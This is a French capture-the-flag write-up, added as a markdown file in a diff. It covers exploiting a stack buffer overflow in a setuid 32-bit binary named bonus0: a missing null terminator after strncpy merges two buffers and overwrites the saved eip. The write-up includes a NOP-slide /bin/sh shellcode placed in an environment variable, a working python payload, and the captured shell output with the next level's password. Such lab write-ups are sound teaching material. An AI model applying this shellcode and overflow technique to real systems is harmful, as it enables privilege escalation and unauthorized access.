@@ -1,0 +1,66 @@
+# Bonus 0
+## Résumé
+Omission ajour \0 terminal dans buffer => fusion de 2 buffer => buffer overflow => eip main écrasé => shellcode dans env
+## Préambule
+```sh
+$> ls -l
+total 8
+-rwsr-s---+ 1 bonus1 users 5566 Mar  6  2016 bonus0
+$> file bonus0 
+bonus0: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xfef8b17db26c56ebfd1e20f17286fae3729a5ade, not stripped
+```
+Le home contient un binaire appartenant à l'user `bonus1` et avec un `suid`. On doit donc exploiter ce binaire pour pouvoir accéder au fichier `/home/user/bonus1/.pass`.
+
+On récupère le fichier `bonus0` sur la VM pour le désassembler avec `radare2` :
+```sh
+$> scp -P 4242 bonus0@10.11.200.192:/home/user/bonus0/bonus0 .
+$> r2 bonus0
+```
+![main_function](Ressources/p_function.png)  
+![main_function](Ressources/pp_function.png)  
+![main_function](Ressources/main_function.png)  
+
+## Analyse
+### Analyse du programme
+La fonction `main` déclare un buffer sur la `stack` de 0x2a (42) caractères qui est donné à la fonction `pp`.
+
+La fonction `pp` déclare deux buffers sur la `stack`, un de 0x14 (20) caractères et un de 0x1c (28) caractères.  
+Tour à tour, les buffers sont remplis dans la fonction `p` puis copiés dans le buffer de la fonction `main`, séparés par un espace. Le premier buffer est copié avec la fonction `strcpy`, et le deuxième buffer est copié avec `strcat`.
+
+La fonction `p` déclare un buffer sur la `stack` de 0x1010 (4112) caractères, utilisé par `read` sur l'entrée standard. Seuls 0x1000 (4096) caractères sont lus, et le premiers retour à la ligne trouvé est remplacé par un `\0` terminal.  
+Les 0x14 (20) premiers caractères du buffer sont ensuite copiés avec `strncpy` dans le buffer associé de la fonction `pp`.  
+Le reste du buffer n'est donc pas utilisé.
+
+### Mise en place de l'exploitation
+La fonction `p` omet de rajouter un `\0` terminal au buffer de la fonction `pp` lors de l'appel de `strncpy`.  
+Comme les deux buffers de la fonctions `pp` sont adjacents dans la `stack`, si l'on rempli le premier buffer sans mettre de `\0` terminal, le deuxième buffer ne sera pas séparé du premier buffer, comme si les deux avaient fusionnés.
+
+L'appel à `strcpy` dans la fonction `pp` permet ainsi de copier dans le buffer de la fonction `main` `0x14+0x1c=0x30=48` caractères maximum.  
+Après l'ajout du caractère espace, `strcat` permet de rajouter encore une fois le deuxième buffer dans le buffer du `main`, donc `1c` (28) caractères. On est bien au delà de l'adresse de `eip`, nous pouvons donc la réécrire.
+
+Pour modifier l'`eip` de retour de la fonction `main`, nous devons mettre dans le buffer de cette fonction un `padding` de : `0x2a(buffer) + 0x8(stack align) + 0x4 (ebp) = 0x36 = 54 caractères`.  
+Avec les buffers de `pp`, nous procédons comme suit : `0x14(buffer1) + 0x13(buffer2 avec strcpy) + espace + 0x13(buffer2 avec strcat) = 0x3b (59 caractères).
+
+Nous mettons dans le buffer2 la nouvelle valeur de `eip` `à l'endroit exact en mémoire. Le schéma ci-dessus aidera la visualisation :  
+![memory_view](Ressources/memory_view.png)
+
+Nous redirigeons l'eip vers le shellcode que l'on aura préalablement mis dans une variable d'environnement puisque ces adresses sont stables sur la `stack`.  
+Comme dans le `level2`, nous utilisons un programme qui utilise `getenv` pour retrouver l'adresse de notre shellcode. Nous mettons tout de même en `nop slide` pour faciliter le saut.
+
+Le shellcode utilisé est celui-ci :
+[shell_code](http://shell-storm.org/shellcode/files/shellcode-752.php)
+## Application
+```sh
+$> export SHELLCODE="`python -c 'print("\x90"*100+"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80")'`"
+$> cd /tmp
+$> ./getenv SHELLCODE ./bonus0
+SHELLCODE found at 0xbffff8ad
+$> (python -c 'print("A"*0x20+"\n"*0xfe0+"A"*0xe+"\xad\xf8\xff\xbf"+"A")'; cat -) | ./bonus0
+ - 
+ - 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����A AAAAAAAAAAAAAA����A
+id
+uid=2010(bonus0) gid=2010(bonus0) euid=2011(bonus1) egid=100(users) groups=2011(bonus1),100(users),2010(bonus0)
+cat /home/user/bonus1/.pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+```
